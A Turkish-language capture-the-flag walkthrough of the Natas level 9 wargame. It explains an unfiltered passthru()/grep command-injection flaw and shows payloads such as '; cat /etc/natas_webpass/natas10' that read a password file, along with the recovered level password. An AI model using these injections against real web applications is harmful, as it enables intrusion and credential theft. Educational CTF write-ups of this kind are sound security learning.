Natas9 sayfasında, kelime araması yapabileceğin bir form var. Arka planda grep komutu çalışıyor.

<img width="958" height="712" alt="image" src="https://github.com/user-attachments/assets/893be2e8-d8f7-43dd-bb98-50a287feaf2d" />

passthru() fonksiyonu sistem komutu çalıştırıyor

Kullanıcı girdisi ($key) doğrudan komuta ekleniyor

Hiçbir filtreleme yok → Command Injection (Komut Enjeksiyonu) zafiyeti var!
Normal bir arama yaptığımızda ise dictionary.txt içinde kelime arıyor:

<img width="841" height="781" alt="image" src="https://github.com/user-attachments/assets/270265f1-16bf-4cd3-bbbe-b74ce10877c8" />

Arama kutusuna basit bir komut enjeksiyonu deneyelim:

; pwd

<img width="796" height="639" alt="image" src="https://github.com/user-attachments/assets/41ad7be3-aded-4c62-a694-b4c8d7fdb891" />

Önce /etc/natas_webpass/ dizininde hangi dosyalar var bakalım:

; ls /etc/natas_webpass

<img width="913" height="818" alt="image" src="https://github.com/user-attachments/assets/a92e7531-c758-4adf-989a-d3d0d43adb7c" />

Hedefimiz natas10 şifresi:

text
; cat /etc/natas_webpass/natas10

Sonuç: Sayfada şifreyi görüyorsun:

text
t71SVHvpa14sJTUGV0cbEsbYfFP2dm0u

<img width="826" height="785" alt="image" src="https://github.com/user-attachments/assets/36667f6d-38a5-49ba-ba7a-7ecf639a5fde" />

